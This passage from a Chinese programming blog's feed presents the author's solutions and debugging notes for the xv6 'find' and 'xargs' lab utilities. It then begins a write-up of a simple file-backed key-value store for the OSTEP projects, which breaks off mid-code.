对目录的读取操作，并使用递归来实现对子目录的查找。基本思路就是打开一个指定路径的文件（目录也算是特殊的文件），并根据文件的类型做不同处理：</p><ol><li>如果文件是常规文件，则判断改文件名是否是目标文件名（<code>find</code> 的第二个参数），如果是，则将其完整路径打印至标准输出。</li><li>如果文件是目录文件，则读取该目录下的所有文件名，并在该目录路径尾部加上 <code>/st.name</code>，依次构造一个新的文件名继续递归调用 <code>find</code>。注意不要递归进入 <code>.</code> 和 <code>..</code>，否则将导致无限递归。 </li></ol><p>以上便是基本思路，具体实现可以阅读完整代码，下面讲一下我遇到的一些问题（bug）：</p><ol><li>使用 <code>fstat</code> 获取文件信息时 <code>st.type</code> 始终为 3（<code>T_DEVICE</code> 类型）。</li></ol><p>这个问题其实挺难绷的，原因是我把 <code>if ((fd = open(path, 0)) &lt; 0)</code> 写成了 <code>if ((fd = open(path, 0) &lt; 0))</code>，因为 <code>&lt;</code> 的优先级大于 <code>=</code>，所以导致 <code>fd</code> 的值始终为 0 或 1（逻辑表达式的值只能为真或假），那么后续产生意想不到的结果也就不意外了。。。</p><ol start="2"><li>出现 <code>find: cannot open file ./sh</code> ，之后所有文件均打开失败</li></ol><p>在打印出文件描述符的值后，问题的起因比较明显了。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/fd.png"></p><p>文件描述符一直在增大，最终文件打开失败，<code>open</code> 返回 -1。很明显，是因为文件在打开后没有及时关闭，并释放文件描述符，最终文件描述符被全部占用，新的文件无法再被打开。这也解释了既然程序退出后，所有打开的文件会自动关闭，为什么还要建议手动关闭文件的问题。</p><ol start="3"><li>读取到空文件名</li></ol><p>前面的问题解决之后，我发现程序仍然会出现无限递归搜索的情况（如下图所示），按理说我已经对文件名进行了判断，如果是 <code>.</code> 或者 <code>..</code> 则不做处理。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/recur.png"></p><p>尝试打印文件名之后，我发现目录的最后一个文件名为空，这样的空文件名将导致程序不断往其末尾追加斜杠 <code>/</code> 而并没有递归进入该目录中。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/bfg.png"></p><p>事实上，使用 <code>read</code> 读取目录时，在读取目录的所有条目之后，会返回一个空的 <code>dirent</code> 结构体，此时 <code>de.name</code> 为空，作为循环结束的标志。其实 <code>user/ls.c</code> 有针对这个特性的判断，不过当时 coding 的时候没有细看。所以正如 Lab guidance 中所说：</p><blockquote><p>Only when you have a firm grasp of the assignment and solution, then start coding.</p></blockquote><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/find.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/stat.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/fs.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">file_name</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> path <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>p <span class="token operator">!=</span> <span class="token string">'/'</span><span class="token punctuation">;</span> <span class="token operator">--</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>p<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">dirent</span> de<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">,</span> <span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot open file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fstat</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot stat file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> T_FILE<span class="token operator">:</span>name <span class="token operator">=</span> <span class="token function">file_name</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T_DIR<span class="token operator">:</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// prevent infinite recursion</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>de<span class="token punctuation">.</span>inum <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// generate path of sub directory</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span><span class="token function">memmove</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> DIRSIZ<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">[</span>DIRSIZ<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">find</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">find</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>相较于 <code>find</code>，<code>xargs</code> 的实现就简单很多了。由于之前自己实现过一个简单的 shell，因此对于 <code>exec</code> 系统调用还算比较熟悉，本题的主要内容就是根据 <code>argv</code> 和标准输入构造一个新的参数列表，作为指定命令行程序的参数，并使用 <code>exec</code> 来进行调用。</p><p>程序的流程比较简单，这里不过多介绍，直接查看完整代码即可。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/xargs.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/param.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> nargv<span class="token punctuation">[</span>MAXARG<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> MAXARG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// remove last '\n'</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>nargv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">exec</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nargv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"xargs: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Boot-xv6&quot;&gt;&lt;a href=&quot;#Boot-xv6&quot; class=&quot;headerlink&quot; title=&quot;Boot xv6&quot;&gt;&lt;/a&gt;Boot xv6&lt;/h1&gt;&lt;p&gt;按照示例切换到 &lt;code&gt;util&lt;/code&gt; 分支后，看到目录下包含 &lt;code&gt;Ma</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projects：KV</title>
    <link href="http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/"/>
    <id>http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/</id>
    <published>2024-05-08T01:03:08.000Z</published>
    <updated>2024-05-10T13:16:13.024Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 KV 部分，包含个人的代码实现和设计思路。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目要求实现一个最简单的数据库，以支持数据的持久化。</p><p>每个操作由格式为 <code>op,[arg1],[arg2]</code> 的命令给出，那么首先要解决的问题就是参数的分离，再根据操作符 op 来对不同的操作进行特殊处理。字符串划分这里采用的是 <code>strsep()</code> 函数：该函数接收两个参数 <code>char** stringp</code> 和 <code>const char* delim</code>，<code>stringp</code> 是指向待分割字符串 <code>string</code> 的指针，<code>delim</code> 则是指定的分隔符，该函数的操作是查找 <code>string</code> 中第一个 <code>delim</code> 的位置 <code>it</code>，并将 <code>stringp</code> 指向 <code>string</code> 中 <code>it + 1</code> 的位置，同时返回<code>string</code> 开头到  <code>it</code> 所有字符所构成的子串（加上 <code>&#39;\0&#39;</code> 终结符）。</p><p>插入操作没什么好说的，直接使用 <code>fprintf()</code> 写入文件即可。对于查找和删除，则需要将数据从文件（数据库）中读取到内存，存储在特定的数据结构中，例如哈希表、红黑树等，但为了代码实现的简单，我使用的是最简单的链表。对于查找，先将所有数据读取到一个链表中，然后按顺序逐个进行查找；对于删除，将所有数据读取到一个链表中，然后逐个遍历链表，如果当前结点的键（key）与参数不同，则写入文件中，否则，不写入（相当于删除）。最后，为了防止内存的泄露，需要在每次结束查找和删除操作之后，将存储数据内容的链表结点的内存空间释放。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DATA_BASE</span> <span class="token string">"./database.txt"</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span><span class="token comment">// 从文件fp中读取数据</span>line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 哨兵结点</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 释放链表内存空间</span><span class="token keyword">void</span> <span class="token function">free_list_mem</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> data<span class="token punctuation">;</span>data <span class="token operator">=</span> data<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> op <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 操作符</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> value <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s,%s\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份（line_buf会被strsep()修改）</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 找到key</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s not found\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span 